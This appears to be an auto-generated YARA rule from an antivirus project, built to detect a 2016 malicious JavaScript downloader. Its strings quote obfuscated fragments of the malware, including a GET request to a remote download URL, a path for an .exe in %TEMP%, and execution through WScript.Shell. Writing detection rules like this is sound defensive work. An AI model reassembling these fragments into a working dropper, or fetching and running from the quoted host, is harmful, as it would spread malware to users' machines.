rule sig_20160329_5b55bb16ecb814aacc9b51a5a98185a7 {
  meta:
    description = "datamaliciousorder - file 20160329_5b55bb16ecb814aacc9b51a5a98185a7.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e7cf01f636da661dd0c6ea83d0c895a6855d81664577164aca70c3e7696f57c3"

  strings:
    $s1  = "function Vqpsduxsj() {return Pmywx[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"RV0nUkKYjMhvKhQA.exe\";};" fullword ascii
    $s2  = "Tentioemg[Krkaess](\"GET\", \"http://rvstuintafel.com/aqp9ik\", false);" fullword ascii
    $s3  = "do {WScript[Ifdcz](Mwvhunokq() * 11)} while (Tentioemg[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "var Pmywx = function Snavx() {return WScript[Skrbw](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Lytswdiq(Ggvvn, Jqxnxvu){return Ggvvn - Jqxnxvu;};" fullword ascii
    $s6  = "function Numqkzb() {return ((Bfayvfnusc == true) && (Bfayvfnusc == Mdinmsqa)) ? 1 : Umqarzoj;};" fullword ascii
    $s7  = "function Gmfhuoej(Gxczl){Pmywx[\"Run\"](Gxczl, Umqarzoj, Umqarzoj);};" fullword ascii
    $s8  = "Bfayvfnusc = true; " fullword ascii
    $s9  = "var Bfayvfnusc = false;" fullword ascii
    $s10 = "var Mdinmsqa = false;" fullword ascii
    $s11 = "function Eybvbndcrf(Imfhuavoiw) {var Ctgtg = (1, 2, 3, 4, 5, Imfhuavoiw); return Ctgtg;};" fullword ascii
    $s12 = "function Rfdfurmmz(){return Skrbw;};" fullword ascii
    $s13 = "function Mwvhunokq(){return 22;};" fullword ascii
    $s14 = "Mdinmsqa = true; " fullword ascii
    $s15 = "var Xdubo = false;" fullword ascii
    $s16 = "function Qipyaps()" fullword ascii
    $s17 = "var Rhlezni = new this[\"Date\"]();" fullword ascii
    $s18 = "function Ufwmlyeacw(){return Yltpy;};" fullword ascii
    $s19 = "return Lytswdiq(Fextrhrygg, Fljii);" fullword ascii
    $s20 = " while (Iegveiwr){" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}